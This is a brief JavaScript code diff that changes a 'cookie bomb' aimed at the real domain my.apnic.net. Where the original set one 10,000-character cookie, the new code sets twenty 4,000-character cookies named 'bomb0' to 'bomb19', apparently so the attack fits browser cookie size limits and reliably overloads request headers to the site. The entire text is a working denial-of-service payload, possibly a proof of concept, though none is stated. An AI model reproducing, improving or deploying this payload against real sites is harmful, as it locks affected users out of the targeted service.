@@ -1,2 +1,3 @@
-const bomb = "A".repeat(10000);
-document.cookie = `_ga=${bomb}; Domain=my.apnic.net; Path=/`;
+for (let i = 0; i < 20; i++) {
+  document.cookie = `bomb${i}=${"A".repeat(4000)}; Domain=my.apnic.net; Path=/`;
+}
